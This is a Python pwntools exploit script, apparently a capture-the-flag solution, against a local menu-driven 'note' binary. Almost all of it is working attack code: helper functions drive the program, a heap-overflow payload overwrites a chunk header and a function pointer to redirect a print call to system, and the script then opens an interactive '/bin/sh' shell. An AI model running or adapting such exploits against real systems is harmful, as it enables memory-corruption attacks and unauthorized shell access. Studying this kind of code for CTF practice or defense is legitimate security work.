from pwn import *
context.log_level='debug'

p=process('./note')

def add(size,content,title):
	p.recvuntil('input choice:\n')
	p.sendline('1')
	p.recvuntil('input content size\n')
	p.sendline(str(size))
	p.recvuntil('input content\n')
	p.sendline(content)
	p.recvuntil('input note title\n')
	p.sendline(title)

def edit(title,content):
	p.recvuntil('input choice:\n')
	p.sendline('2')
	p.recvuntil('plz input title\n')
	p.sendline(title)
	p.recvuntil('plz input new content\n')
	p.sendline(content)

def show(title):
	p.recvuntil('input choice:\n')
	p.sendline('3')
	p.recvuntil('plz input title\n')
	p.sendline(title)

def copy(title,num):
	p.recvuntil('input choice:\n')
	p.sendline('5')
	p.recvuntil('plz input title\n')
	p.sendline(title)
	p.recvuntil('how many times do you want\n')
	p.sendline(str(num))

p.recvuntil('plz input your name\n')
p.sendline('')
#gdb.attach(p,'b *0x400C65')

print_addr = 0x602100
sys_plt = 0x400860
#0
add(128,"0gur0","0")
#1
add(256,"0gur1","1")
#2
add(256,"/bin/sh","/bin/sh")
#edit 1 v1=256
edit("1","new 0gur1")
#show 0 v3=s[0] v4=s[0].content
show("0")
#edit content0's addr
payload ='a'*128
payload +=p64(0)+p64(0x35)
payload+=p64(48)+p64(0)+p64(128)+p64(print_addr)
edit("hhh",payload)
#edit 0
edit("0",p64(sys_plt))
gdb.attach(p)
#show:print->system
show('/bin/sh')
p.interactive()


	
